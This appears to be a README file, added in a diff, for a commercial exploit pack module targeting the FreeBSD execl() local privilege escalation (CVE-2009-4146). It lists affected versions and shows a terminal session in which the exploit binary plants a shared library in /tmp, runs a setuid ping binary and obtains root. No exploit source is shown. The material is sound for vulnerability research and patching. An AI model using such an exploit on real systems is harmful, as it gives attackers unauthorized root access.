@@ -1,0 +1,73 @@
+D2 Exploitation Pack
+====================
+
+Copyright (c) 2007-2009 DSquare Security, LLC
+
+
+License information
+-------------------
+
+See the file "LICENSE.txt" for information on the history of this
+software, terms & conditions for usage, and a DISCLAIMER OF ALL
+WARRANTIES.
+
+Vulnerability description:
+---------------------------
+
+FreeBSD 'execl()' Local Privilege Escalation Vulnerability
+
+CVE:        CVE-2009-4146
+Remote:     No
+Local:      Yes
+Published:  Nov 30 2009 12:00AM
+Updated:    Dec 14 2009 07:23PM
+Credit:     Nikolaos Rangos (Kingcope) 
+Vulnerable: FreeBSD 8.0-STABLE
+            FreeBSD 8.0-RELEASE
+            FreeBSD 7.2-STABLE
+            FreeBSD 7.2-RELEASE-p4
+            FreeBSD 7.2-RELEASE-p1
+            FreeBSD 7.2-RC2
+            FreeBSD 7.2-PRERELEASE
+            FreeBSD 7.1-STABLE
+            FreeBSD 7.1-RELEASE-p6
+            FreeBSD 7.1-RELEASE-p5
+            FreeBSD 7.1-RELEASE-p4
+            FreeBSD 7.1 -RELEASE-p2
+            FreeBSD 7.1 -RELEASE-p1
+            FreeBSD 7.1 -PRE-RELEASE
+            FreeBSD 7.0-STABLE
+            FreeBSD 7.0-RELEASE-p8
+            FreeBSD 7.0-RELEASE-p3
+            FreeBSD 7.0-RELEASE-p12
+            FreeBSD 7.0-RELEASE-p11
+            FreeBSD 7.0-RELEASE-p11
+            FreeBSD 7.0-RELEASE
+            FreeBSD 7.0 BETA4
+            FreeBSD 7.0 -RELENG
+            FreeBSD 7.0 -RELEASE-p9
+            FreeBSD 7.0 -PRERELEASE
+            FreeBSD 7.0
+
+Tested:     FreeBSD 7.0-RELEASE x86
+
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-4146
+
+Exploit
+--------
+
+%id
+uid=1001(compaq) gid=1001(compaq) groups=1001(compaq)
+%./d2sec_rtld
+[+] /tmp/d2.so created
+[+] exec ping suid binary
+/libexec/ld-elf.so.1: environment corrupt; missing value for 
+/libexec/ld-elf.so.1: environment corrupt; missing value for 
+/libexec/ld-elf.so.1: environment corrupt; missing value for 
+/libexec/ld-elf.so.1: environment corrupt; missing value for 
+/libexec/ld-elf.so.1: environment corrupt; missing value for 
+# id
+uid=1001(compaq) gid=1001(compaq) euid=0(root) groups=1001(compaq)
+# uname -a
+FreeBSD freebsd 7.0-RELEASE FreeBSD 7.0-RELEASE #0: Sun Feb 24 19:59:52 UTC 2008     root@logan.cse.buffalo.edu:/usr/obj/usr/src/sys/GENERIC  i386
+
